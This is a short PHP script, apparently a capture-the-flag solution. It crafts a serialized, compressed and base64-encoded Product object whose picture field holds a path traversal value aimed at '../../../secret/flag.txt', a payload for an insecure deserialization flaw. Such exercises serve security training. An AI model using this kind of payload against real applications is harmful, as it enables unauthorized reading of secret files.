<?php

class Product {

	private $id;
	private $name;
	private $description;
	private $picture;
	private $price;

	function __construct($id, $name, $description, $picture, $price) {
		$this->id = $id;
		$this->name = $name;
		$this->description = $description;
		$this->picture = $picture;
		$this->price = $price;
	}
}

$modified_product = new Product(99, "nice_product", "nice_product", "../../../secret/flag.txt", 99);

echo base64_encode(gzcompress(serialize($modified_product)));
